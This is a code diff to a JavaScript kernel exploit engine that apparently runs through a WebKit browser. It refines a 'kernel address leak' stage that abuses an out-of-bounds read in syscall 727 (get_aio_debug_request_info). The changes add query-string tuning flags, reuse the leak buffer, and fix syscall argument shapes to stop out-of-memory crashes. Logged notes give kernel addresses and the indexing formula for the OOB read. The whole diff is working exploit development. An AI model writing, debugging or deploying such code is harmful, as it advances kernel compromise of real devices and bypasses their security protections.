@@ -198,7 +198,35 @@ export function makeBagagwaEngine(X) {
 
         // [OOM-fix] engine allocation ledger for the stage-4 trim.
         allocs: [],
+        debugLeakBuf: null,
     };
+
+    // [OOM-fix] 727 leak config from the query string.
+    //   ?noleak=1     skip the 727 debug-info leak entirely (A/B test: if the
+    //                 "not enough free memory" dialog disappears with this,
+    //                 the leak call was the cause)
+    //   ?leak=N       cap leak attempts (default LEAK_ATTEMPTS=16, each is
+    //                 attempts x requests syscalls)
+    //   ?leakshape=0|1
+    //     0 (default): (req_id, dst*, 0)   — PSAITO bagagwa_uaf_1320 proven shape
+    //     1          : (req_id, 0, dst*)   — aio_reach d3 probe shape
+    //   The OLD engine shape (req_id, dst*, 0x100) put 0x100 into an unproven
+    //   slot. If that slot is a COUNT the kernel iterates 256x per call, and
+    //   if the ABI is (id, count, dst*) then the POINTER in the count slot is
+    //   the documented "pointer-as-count -> huge kernel alloc -> OOM" class
+    //   (same as 0x29C upstream v8). That is the prime suspect for the OOM
+    //   that appeared exactly when the leak was wired in.
+    function QP(name, dflt) {
+        try {
+            const m = ((globalThis.location && globalThis.location.search) || "")
+                .match(new RegExp("[?&]" + name + "=([^&]+)"));
+            return m ? decodeURIComponent(m[1]) : dflt;
+        } catch { return dflt; }
+    }
+    const NO_LEAK = QP("noleak", "") === "1";
+    const LEAK_ATTEMPTS_EFF = Math.max(1, Math.min(LEAK_ATTEMPTS,
+        parseInt(QP("leak", String(LEAK_ATTEMPTS)), 10) || LEAK_ATTEMPTS));
+    const LEAK_SHAPE = (QP("leakshape", "0") === "1") ? 1 : 0;
 
     function alloc(size, label) {
         const dwords = Math.ceil(size / 4);
@@ -602,13 +630,24 @@ export function makeBagagwaEngine(X) {
             return { ok: false, why: "syscall 727 (0x2D7) has no stub and no raw-syscall path" };
         }
 
-        const outBuf = safeAlloc(0x100, "aio-debug-leak");
-        if (!outBuf) return { ok: false, why: "debug-leak buffer OOM (arena exhausted)" };
+        // [OOM-fix] ONE reused buffer for the whole stage instead of a fresh
+        // 1.25KB pinned alloc per call (16 attempts x N requests used to pin
+        // every dead buffer in P.nogc forever).
+        if (!S.debugLeakBuf) {
+            S.debugLeakBuf = safeAlloc(0x100, "aio-debug-leak");
+            if (!S.debugLeakBuf) return { ok: false, why: "debug-leak buffer OOM (arena exhausted)" };
+            S.debugLeakBuf.keep = true; // reused every call until chain death
+        }
+        const outBuf = S.debugLeakBuf;
         for (let i = 0; i < 0x100; i++) outBuf.u8[i] = 0;
 
         const composedId = ((tableIdx & 0x7F) << 16) | (reqId & 0xFFFF);
 
-        const r = await sys(SYS_GET_AIO_DEBUG_REQ_INFO, composedId, outBuf.base, 0x100);
+        // [OOM-fix] proven ABI shapes only — never leave 0x100 in an unproven
+        // slot (pointer-in-count-slot = huge kernel alloc = OOM, see 0x29C).
+        const r = (LEAK_SHAPE === 1)
+            ? await sys(SYS_GET_AIO_DEBUG_REQ_INFO, composedId, 0, outBuf.base)
+            : await sys(SYS_GET_AIO_DEBUG_REQ_INFO, composedId, outBuf.base, 0);
         if (r.failed) return { ok: false, why: "get_aio_debug_request_info failed: " + r.errText };
 
         const leaked = [];
@@ -1314,12 +1353,18 @@ export function makeBagagwaEngine(X) {
 
         note("=== Stage 2: kernel address leak ===");
 
-        if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined || P.rawSyscall) {
+        if (NO_LEAK) {
+            note("[727] DISABLED via ?noleak=1 — skipping debug-info leak entirely " +
+                "(pipe/lapse/waker routes only). A/B test: if the OOM dialog is " +
+                "gone with this flag, the leak call was the cause.");
+        } else if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined || P.rawSyscall) {
             note("syscall 727 (0x2D7) " + (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined
                 ? "stub available" : "called via RAW path (WebKit syscall;ret)") +
                 " — get_aio_debug_request_info @ 0x805c3090");
             note("OOB: source idx = (req_id>>16)+edx scaled by 0x28 into [rax+0x20]");
-            for (let tIdx = 0; tIdx < LEAK_ATTEMPTS; tIdx++) {
+            note("[727] shape=" + (LEAK_SHAPE === 1 ? "(id,0,dst)" : "(id,dst,0)") +
+                " attempts=" + LEAK_ATTEMPTS_EFF + " (?leakshape=1 ?leak=N to tune)");
+            for (let tIdx = 0; tIdx < LEAK_ATTEMPTS_EFF; tIdx++) {
                 for (let i = 0; i < S.aioRequests.length; i++) {
                     const lr = await leakViaDebugInfo(S.aioRequests[i].id, tIdx);
                     if (lr.ok) {
